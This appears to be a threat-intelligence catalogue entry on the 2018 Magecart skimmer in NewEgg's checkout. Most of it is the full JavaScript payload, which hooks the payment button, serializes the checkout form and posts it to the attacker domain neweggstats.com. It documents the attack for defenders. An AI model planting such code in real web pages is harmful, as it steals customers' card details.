---
title: NewEgg magecart skimmer
date: '2018-09-18'
tags:
  - web
  - supply-chain
  - magecart
  - e-skimmer
---

This skimmer exfiltrated payment data from NewEgg's checkout flow by binding an event handler to the payment button and sending a payload to the (Malicious/Dead) url `https://neweggstats.com/GlobalData/`. This skimmer was active from August 14, 2018 to September 18, 2018.

- - -

## References

- [Hackers stole customer credit cards in Newegg data breach](https://techcrunch.com/2018/09/19/newegg-credit-card-data-breach/)
- [Another Victim of the Magecart Assault Emerges: Newegg](https://www.riskiq.com/blog/labs/magecart-newegg/)

## Payload

```js
window.onload = function() {
  jQuery("#btnCreditCard.paymentBtn.creditcard").bind(
    "mouseup touchend",
    function(e) {
      var dati = jQuery("#checkout");
      var pdati = JSON.stringify(dati.serializeArray());
      setTimeout(function() {
        jQuery.ajax({
          type: "POST",
          async: true,
          url: "https://neweggstats.com/GlobalData/",
          data: pdati,
          dataType: "application/json"
        });
      }, 250);
    }
  );
};
```
